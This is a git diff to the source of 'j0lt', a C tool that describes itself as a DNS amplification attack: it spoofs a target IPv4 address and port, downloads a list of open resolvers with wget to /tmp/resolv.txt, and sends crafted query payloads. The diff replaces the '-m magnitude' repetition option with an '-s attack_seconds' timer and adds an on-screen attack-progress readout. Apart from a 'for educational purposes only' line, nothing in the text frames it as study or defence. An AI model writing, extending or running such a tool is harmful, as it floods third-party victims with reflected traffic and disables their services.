@@ -10,7 +10,7 @@
  * For educational purposes only
  * the-scientist@rootstorm.com
  * ------------------------------------------------------------
- * Usage: sudo ./j0lt -t <target> -p <port> -m <magnitude>
+ * Usage: sudo ./j0lt -t <target> -p <port> -s <attack_seconds>
  * (the-scientist㉿rs)-$ gcc j0lt.c -o j0lt
  * (the-scientist㉿rs)-$ sudo ./j0lt -t 127.0.0.1 -p 80 -m 1337
  * ------------------------------------------------------------
@@ -160,7 +160,7 @@ DEFINE_INSERT_FN(qword, uint64_t)
 #define     MAX_LINE_SZ_J0LT 0x30
 
 char** environ;
-const char* g_args = "xdt:p:m:r:s:";
+const char* g_args = "xdt:p:r:s:";
 const char* g_path = "/tmp/resolv.txt";
 char* g_wget[] = {
     "/bin/wget", "-O", "/tmp/resolv.txt",
@@ -169,12 +169,11 @@ char* g_wget[] = {
 };
 
 const char* g_menu = {
-        "  PRIVATE CONFIDENTIAL SOURCE MATERIALS DO NOT DISTRIBUTE \n"
+        " PRIVATE CONFIDENTIAL SOURCE MATERIALS DO NOT DISTRIBUTE  \n"
         " =========================================================\n"
-        " Usage: sudo ./j0lt -t -p -m -s [OPTION]...               \n"
+        " Usage: sudo ./j0lt -t -p -s [OPTION]...                  \n"
         " -t <target>                      : target IPv4 (spoof)   \n"
         " -p <port>                        : target port           \n"
-        " -m <magnitude>                   : magnitude of attack   \n"
         " -x [hexdump]                     : print hexdump         \n"
         " -d [debug]                       : offline debug mode    \n"
         " -r [resolv]<path>                : will not download list\n"
@@ -221,9 +220,8 @@ main(int argc, char** argv)
         int status, i, opt, s, pathsz, nread;
         bool debugmode, hexmode, filereadmode;
         size_t szresolvlist, szpayload, szpewpew;
-        uint32_t spoofip, resolvip;
-        uint16_t spoofport, magnitude;
-	uint32_t attack_seconds;
+        uint32_t spoofip, resolvip, attack_seconds;
+        uint16_t spoofport;
         pid_t child_pid;
         sigset_t mask;
         posix_spawnattr_t attr;
@@ -234,7 +232,7 @@ main(int argc, char** argv)
         printf("%s", g_menu);
 
         filereadmode = debugmode = hexmode = false;
-        magnitude = spoofport = spoofip = attack_seconds = 0;
+        spoofport = spoofip = attack_seconds = 0;
         opt = getopt(argc, argv, g_args);
         do {
                 switch (opt) {
@@ -250,12 +248,6 @@ main(int argc, char** argv)
                         spoofport = (uint16_t)strtol(optarg, &endptr, 0);
                         if (errno != 0 || endptr == optarg || *endptr != '\0')
                                 err_exit("* spoof port invalid");
-                        break;
-                case 'm':
-                        errno = 0;
-                        magnitude = (uint16_t)strtol(optarg, &endptr, 0);
-                        if (errno != 0 || endptr == optarg || *endptr != '\0')
-                                err_exit("* magnituted invalid");
                         break;
                 case 'r':
                         while (*optarg == ' ')
@@ -281,12 +273,12 @@ main(int argc, char** argv)
                         break;
                 case -1:
                 default: /* '?' */
-                        err_exit("Usage: ./j0lt -t target -p port -m magnitude -s attack_seconds [OPTION]...\n");
+                        err_exit("Usage: ./j0lt -t target -p port -s attack_seconds [OPTION]...\n");
                 }
         } while ((opt = getopt(argc, argv, g_args)) != -1);
 
-        if (magnitude == 0 || spoofport == 0 || spoofip == 0 || attack_seconds == 0)
-                err_exit("Usage: ./j0lt -t target -p port -m magnitude -s attack_seconds [OPTION]...\n");
+        if (spoofport == 0 || spoofip == 0 || attack_seconds == 0)
+                err_exit("Usage: ./j0lt -t target -p port -s attack_seconds [OPTION]...\n");
 
         attrp = NULL;
         file_actionsp = NULL;
@@ -336,13 +328,19 @@ main(int argc, char** argv)
                 printf("- resolv list removed from %s\n", pathptr);
         }
 
-        clock_t end_attack_miliseconds =
+        clock_t attack_end_time_milliseconds =
 	        (clock_ms() + attack_seconds * 1000);
-        while (magnitude >= 1 && clock_ms() <= end_attack_miliseconds) {
+        clock_t current_time_milliseconds;
+        while ((current_time_milliseconds = clock_ms()) <= attack_end_time_milliseconds) {
                 nread = 0;
                 resolvptr = (char*)resolvlist;
-                printf("+ current attack magnitude %d \n", magnitude);
-                while (nread = readline(lineptr, resolvptr, MAX_LINE_SZ_J0LT, szresolvlist) != 0) {
+                double progress_ratio =
+                        1 -
+                        (double)(attack_end_time_milliseconds - current_time_milliseconds) /
+                        (attack_seconds * 1000);
+                printf("\e[2K\r+ attack progress: %d%%", (int)(progress_ratio * 100));
+                fflush(stdout);
+		while (nread = readline(lineptr, resolvptr, MAX_LINE_SZ_J0LT, szresolvlist) != 0) {
                         resolvptr += nread;
                         szresolvlist -= nread;
                         for (i = 0; isdigit(lineptr[i]); i++)
@@ -361,8 +359,8 @@ main(int argc, char** argv)
                         if (hexmode == 1)
                                 print_hex(payload, szpayload);
                 }
-                magnitude--;
         }
+        printf("\e[2K\r+ attack has finished in %d seconds", attack_seconds);
 
         free(resolvlist);
         return 0;
